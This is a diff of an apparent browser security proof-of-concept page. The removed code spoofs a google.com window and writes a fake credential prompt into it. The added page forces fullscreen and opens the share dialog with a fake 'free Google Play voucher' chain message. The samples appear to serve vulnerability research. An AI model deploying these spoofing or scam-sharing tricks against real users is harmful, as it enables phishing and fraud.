@@ -1,23 +1,56 @@
-    <script>
-      function spoof() {
-        // Buka page baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/", "_blank");
+<!doctype html>
+<html>
 
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
+<head>
+    <title>Share Test</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        html {
+            font-family: sans-serif;
+            user-select: none;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        h1 {
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Click to Share</h1>
+
+    <script>
+        const shareData = {
+            text: "Hi! You've won a $100 free Google Play voucher. Share the link with 5 people to redeem.",
+        };
+
+        async function goFullscreenAndShare() {
+            try {
+                // Request fullscreen first
+                if (document.documentElement.requestFullscreen) {
+                    await document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) { // Safari
+                    await document.documentElement.webkitRequestFullscreen();
+                }
+
+                // Then trigger share dialog
+                await navigator.share(shareData);
+            } catch (err) {
+                console.log("Error:", err);
+            }
+        }
+
+        document.body.addEventListener('click', goFullscreenAndShare);
     </script>
+</body>
+
+</html>
